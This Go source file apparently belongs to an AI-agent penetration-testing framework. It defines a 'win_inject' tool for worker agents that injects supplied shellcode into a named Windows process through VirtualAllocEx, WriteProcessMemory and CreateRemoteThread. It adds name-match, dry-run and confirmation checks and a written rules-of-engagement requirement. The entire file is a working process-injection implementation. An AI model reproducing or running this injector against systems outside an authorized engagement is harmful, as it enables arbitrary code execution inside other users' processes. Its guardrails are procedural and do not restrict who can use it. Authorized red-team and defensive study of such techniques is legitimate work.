//go:build windows

package server

// Windows-only process injection. This is deliberately narrow:
//   - target basename must match process_name exactly;
//   - low PIDs (System/Idle) are rejected;
//   - dry_run validates without touching the target;
//   - confirm=true is required for the actual injection;
//   - shellcode is capped at 1MB and never returned.
// There is no shellcode generation, no APC path, no persistence, and no default
// automatic use by the planner.

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"path/filepath"
	"strings"
	"unsafe"

	actool "github.com/Autumn-27/norma/tool"
	"golang.org/x/sys/windows"
)

func (s *Server) winInjectTools() []actool.CoreTool {
	return []actool.CoreTool{s.toolWinInject()}
}

func (s *Server) seedWinInjectTools() {
	if s.m == nil || s.m.pg == nil {
		return
	}
	workerAgents, _ := json.Marshal([]string{"worker"})
	for _, t := range s.winInjectTools() {
		schema, _ := json.Marshal(t.InputSchema())
		if err := s.m.PG().SeedTool(t.Name(), t.Description(), schema, workerAgents); err != nil {
			log.Printf("[tools] seed %s 失败: %v", t.Name(), err)
		}
	}
}

func (s *Server) toolWinInject() actool.CoreTool {
	return actool.Build(actool.Spec{
		Name: "win_inject",
		Description: "【Windows 进程注入·高影响】把 Base64/hex raw shellcode 注入指定 PID（CreateRemoteThread）。" +
			"必须 process_name 与实际进程 basename 完全匹配，且 confirm=true；dry_run 只校验。仅 Windows；不生成 shellcode，不做 APC/持久化。" +
			"这是高影响动作，必须在书面 RoE 与目标进程白名单内使用。",
		Schema:      winInjectSchema(),
		ReadOnly:    func(json.RawMessage) bool { return false },
		Permissions: sessionPerm,
		Run: func(ctx context.Context, in json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			var p winInjectParams
			if err := json.Unmarshal(in, &p); err != nil {
				return actool.Errorf("参数解析失败：" + err.Error()), nil
			}
			sc, err := p.Normalize()
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			path, err := windowsProcessPath(p.PID)
			if err != nil {
				return actool.Errorf("查询进程失败: " + err.Error()), nil
			}
			base := filepath.Base(path)
			if !strings.EqualFold(base, p.ProcessName) {
				return actool.Errorf(fmt.Sprintf("进程名不匹配：实际 %q，参数 %q（拒绝注入）", base, p.ProcessName)), nil
			}
			if p.DryRun {
				return jsonResult(winInjectResult(&p, path, sc, "dry_run"))
			}
			if err := injectWindowsProcess(p.PID, sc); err != nil {
				return actool.Errorf("注入失败: " + err.Error()), nil
			}
			log.Printf("[win_inject] pid=%d process=%s bytes=%d", p.PID, base, len(sc))
			return jsonResult(winInjectResult(&p, path, sc, "success"))
		},
	})
}

func windowsProcessPath(pid int) (string, error) {
	h, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, uint32(pid))
	if err != nil {
		return "", err
	}
	defer windows.CloseHandle(h)
	buf := make([]uint16, 32768)
	size := uint32(len(buf))
	if err := windows.QueryFullProcessImageName(h, 0, &buf[0], &size); err != nil {
		return "", err
	}
	return windows.UTF16ToString(buf[:size]), nil
}

func injectWindowsProcess(pid int, sc []byte) error {
	if len(sc) == 0 {
		return fmt.Errorf("空 shellcode")
	}
	const access = windows.PROCESS_CREATE_THREAD | windows.PROCESS_VM_OPERATION |
		windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ | windows.PROCESS_QUERY_INFORMATION
	h, err := windows.OpenProcess(access, false, uint32(pid))
	if err != nil {
		return fmt.Errorf("OpenProcess: %w", err)
	}
	defer windows.CloseHandle(h)

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	virtualFreeEx := kernel32.NewProc("VirtualFreeEx")
	createRemoteThread := kernel32.NewProc("CreateRemoteThread")

	addr, _, callErr := virtualAllocEx.Call(
		uintptr(h), 0, uintptr(len(sc)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_EXECUTE_READWRITE),
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx: %v", callErr)
	}
	cleanup := func() {
		_, _, _ = virtualFreeEx.Call(uintptr(h), addr, 0, uintptr(windows.MEM_RELEASE))
	}

	var written uintptr
	if err := windows.WriteProcessMemory(h, addr, &sc[0], uintptr(len(sc)), &written); err != nil {
		cleanup()
		return fmt.Errorf("WriteProcessMemory: %w", err)
	}
	if written != uintptr(len(sc)) {
		cleanup()
		return fmt.Errorf("WriteProcessMemory 只写入 %d/%d 字节", written, len(sc))
	}
	var tid uint32
	hThread, _, callErr := createRemoteThread.Call(
		uintptr(h), 0, 0, addr, 0, 0, uintptr(unsafe.Pointer(&tid)),
	)
	if hThread == 0 {
		cleanup()
		return fmt.Errorf("CreateRemoteThread: %v", callErr)
	}
	_ = windows.CloseHandle(windows.Handle(hThread))
	return nil
}
